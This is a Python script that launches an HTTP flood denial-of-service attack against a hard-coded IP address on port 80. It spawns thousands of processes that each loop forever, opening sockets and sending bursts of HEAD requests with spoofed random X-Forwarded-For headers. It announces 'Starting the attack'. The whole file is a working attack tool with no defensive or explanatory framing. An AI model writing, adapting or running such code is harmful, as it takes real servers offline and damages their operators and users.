import socket
import os, sys
import time
import multiprocessing, random

ip = "88.198.18.78"
port = int("80")

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[>>>] Starting the attack [<<<]")


time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass


def attack2():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass


def attack3():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass


def attack4():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass


def attack5():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass


def send2attack():
  for i in range(5000):
    mp = multiprocessing.Process(target=attack)
    mp2 = multiprocessing.Process(target=attack2)
    mp3 = multiprocessing.Process(target=attack3)
    mp4 = multiprocessing.Process(target=attack4)
    mp5 = multiprocessing.Process(target=attack5)    
    mp.setDaemon = False
    mp2.setDaemon = False
    mp3.setDaemon = False
    mp4.setDaemon = False
    mp5.setDaemon = False
    mp.start()
    mp2.start()
    mp3.start()
    mp4.start()
    mp5.start()

send2attack()